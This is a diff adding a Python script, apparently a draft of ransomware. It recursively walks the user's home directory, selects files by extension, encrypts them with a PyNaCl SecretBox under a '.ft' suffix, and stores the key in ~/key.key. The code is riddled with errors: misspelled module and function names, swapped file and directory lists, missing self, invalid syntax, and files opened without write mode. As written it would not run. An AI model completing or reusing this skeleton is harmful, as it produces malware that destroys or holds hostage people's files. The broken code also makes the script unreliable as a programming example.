@@ -1,0 +1,74 @@
+import nacl.secret
+import nacl.utils
+import os
+import extensions.py
+
+EXTENSION = ".ft"
+class twk_encrypter():
+    def __init__(self, flags):
+        self.flags = flags
+        self.home  = os.environ("HOME")
+        if (not self.home):
+            print("Could not get HOME global variable")
+            return
+        self.key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
+        self.box = secret.nacle.SecretBox(self.key)
+        self.extensions = [e[1:] for e in  extensions.extensions]
+        print("extensions went form: ", flags['extensions'][:10])
+        print("to ", self.extensions[:10])
+        self.nonce = (1).to_bytes(24, 'little');
+        with open(os.enviorn["HOME"] + "/key.key", "wb") as kf:
+            kf.write(self.key)
+
+    def encrypt(self, path = self.home):
+        directories = []
+        files = []
+        for f in os.listdir(path):
+            file_route = path + '/' + f
+            if not os.access(file_route, os.W_OK | os.R_OK, follow_symlinks = False): # TODO by defautl it is using the real UIDD instead of the effective UIDD. This should be cchecked, I want to knwo wheter i have acces or not. I dont want to know if I should have access.
+                continue
+            if os.is_dir(file_route, follow_simlinks=False):
+                files.append(file_route)
+            elif f.split(".")[-1] in self.extensions:
+                print(f"adding {f} to files to encrypt")
+                directories.append(file_route)
+
+        for f in files:
+            self.encrypt_file(file_route)
+
+        for d in directories:
+            self.encrypt(d)
+
+        self.nonce = int.from_bytes(self.nonce, 'little') + 1
+        self.nonce = self.nonce.to_bytes(24, 'little')
+        print("The new nonce is : ", self.nonce)
+
+    def encrypt_file(f):
+        '''
+            Must recive the absolute path of the file
+        '''
+        # TODO Is thsi protectin oK? or its too much c way
+        fpi = open(f, 'rb')
+        if (not fpi):
+            return
+        fo = f + EXTENSION if f[-3:] != EXTENSION
+        print(f"new file name {fo}")
+        fpo = open(fo)
+        if (not fpo):
+            fpi.close()
+            return 
+        
+        #TODO its reading the hole file in once. Doesnt loook like a good idea
+        text = fpi.read()
+        encrypted_text = self.box.encrypt(text, nonce=(self.nonce).to_bytes(24, 'little'))
+        fpo.write(encrypted_text)
+
+        fpi.close()
+        fpo.close()
+
+
+if __name__ == "__main__":
+    flags = {"silent": False}
+    encrypter = twk_encrypter(flags)
+    encrypter.encrypt()
+
